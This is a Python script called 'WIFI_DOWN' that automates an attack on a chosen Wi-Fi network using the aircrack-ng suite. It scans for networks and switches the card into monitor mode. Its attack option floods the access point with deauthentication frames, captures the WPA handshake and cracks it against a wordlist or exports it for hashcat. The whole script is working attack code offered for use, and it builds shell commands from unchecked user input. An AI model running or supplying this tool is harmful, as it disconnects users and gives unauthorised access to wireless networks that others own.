import os
global ADDRESS
global CHANNEL
global SSID
global PASSWORDS
global NETWORK_CARD
global CARD
global LINE
SSID = ""
print(" ")
print("WIFI_DOWN")
print("by steel99xl")
print(" ")
print("Please select your WIFI device of choise")
print("Must Support MONITOR MODE")
print("")
os.system("ifconfig | awk -F':' {'print $1'} |cut -d' ' -f1 |awk /./")
print("")
NETWORK_CARD = str(input("DEVICE : "))

os.system('clear')

while True:

    def Device():
        global NETWORK_CARD
        print("Preparing to switch Network Cards")
        os.system("sudo airmon-ng stop "+ NETWORK_CARD +" sudo airmon-ng stop " +NETWORK_CARD)
        print("Please select your WIFI device of choise")
        os.system("ifconfig | awk -F':' {'print $1'} |cut -d' ' -f1 |awk /./")
        NETWORK_CARD = str(input("DEVICE : "))

    def Network():
        global ADDRESS
        global SSID
        global CHANNEL
        global LINE
        os.system("sudo iwlist "+ NETWORK_CARD+" scan > /tmp/WIFI.txt")
        os.system("cat /tmp/WIFI.txt | awk -F'ESSID:' {'print $2'} | awk /./ > /tmp/SSID.txt && cat /tmp/SSID.txt")
        os.system("cat /tmp/WIFI.txt  | awk -F'Address: ' {'print $2'} | awk /./ > /tmp/Address.txt")
        os.system("cat /tmp/WIFI.txt  | awk -F'Channel:' {'print $2'} | awk /./ > /tmp/Channel.txt")
        print("")
        User_SSID = input("Please enter the WIFI network name : ")
        SSID = User_SSID
        with open('/tmp/SSID.txt') as User_Readable:
            for num, line in enumerate(User_Readable,1):
                if User_SSID in line:
                    LINE = str(num)
                    LINE = int(LINE) - 1

        with open('/tmp/Address.txt') as User_Address:
            lines = User_Address.read().splitlines()
            ADDRESS = lines[int(LINE)]

        with open('/tmp/Channel.txt') as User_Channel:
            lines = User_Channel.read().splitlines()
            CHANNEL = lines[int(LINE)]

    def Monitor_Mode():
        global CARD
        global NETWORK_CARD
        NETWORK_CARD = os.system("sudo airmon-ng start "+ NETWORK_CARD +" | cut -d ']' -f3 | cut -d ')' -f1 | awk /./ > /tmp/Network_Card.txt")
        def file_len():
            global CARD
            with open('/tmp/Network_Card.txt') as F:
                for CARD, l in enumerate(F):
                    pass
            return CARD + 1
        file_len()

        with open('/tmp/Network_Card.txt') as F:
            lines = F.read().splitlines()
            NETWORK_CARD = lines[CARD]

    def Attack():
        global ADDRESS
        global CHANNEL
        global NETWORK_CARD
        print("do a thing.... please")
        os.system("sudo aireplay-ng -0 100 -a "+ ADDRESS +"  "+ NETWORK_CARD +" & sudo airodump-ng --bssid "+ ADDRESS+" --channel "+ CHANNEL +" --output-format cap --write ~/Desktop/Breaker " + NETWORK_CARD)
        print("")
        B = input("Do you want to export the file so it can work in hashcat? (Y/N)")
        if(B == "Y" or B == "y"):
            os.system("aircrack-ng ~/Desktop/Breaker.cap -f hashcat")
        else:
            print("")
            B = input("Would you like to strat cracking the Password(Y/N)")
            if(B == "Y" or B == "y"):
                Password = input("Please enter the path for your Password List: ")
                os.system("aircrack-ng -b "+ADDRESS+" -w "+ Password+ " ~/Desktop/Breaker.cap")
            else:
                print("")
                

    def Menu():
        os.system("clear")
        print("")
        print("WIFI_DOWN")
        print("")
        print("WIFI_DEVICE : " + NETWORK_CARD)
        print("WIFI_NETWORK : " + SSID)
        print(" ")
        print("[1] Select Wifi Card")
        print("[2] Select Network for penitration")
        print("[3] Set to Attack mode")
        print("[4] Penitrate Specified Network")
        X = input("Please Select an Option : ")
        if(X == "1"):
            Device()
        else:
            pass
        if(X == "2"):
            Network()
        else:
            pass
        if(X == "3"):
            Monitor_Mode()
        else:
            pass
        if(X == "4"):
            Attack()
        else:
            pass
    try:
        Menu()
    except KeyboardInterrupt:
        print(" ")
        print("Seting Network Card back to Managed Mode")
        os.system("sudo airmon-ng stop "+ NETWORK_CARD +" sudo airmon-ng stop " +NETWORK_CARD)
        print("")
        os._exit(0)
